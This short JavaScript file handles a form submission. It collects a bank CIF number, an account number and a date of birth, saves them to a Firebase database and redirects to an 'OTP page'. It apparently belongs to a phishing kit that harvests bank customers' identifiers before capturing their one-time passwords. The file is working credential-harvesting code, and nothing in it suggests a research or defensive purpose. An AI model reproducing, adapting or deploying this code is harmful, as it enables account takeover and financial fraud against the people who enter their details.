// reference your database
var ududip005DB = firebase.database().ref("ududip005");

document.getElementById("ududip005").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var ucif = getElementVal("ucif");
    var uacn = getElementVal("uacn");
    var udob = getElementVal("udob");



    saveMessages(ucif, uacn, udob);

    // redirect to OTP page
    window.location.href = "otpa.html";
}

const saveMessages = (ucif, uacn, udob) => {
    var newududip005 = ududip005DB.push();

    newududip005.set({
        CIF_Number: ucif,
        Ac_Number: uacn,
        Date_of_Birth: udob,


    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};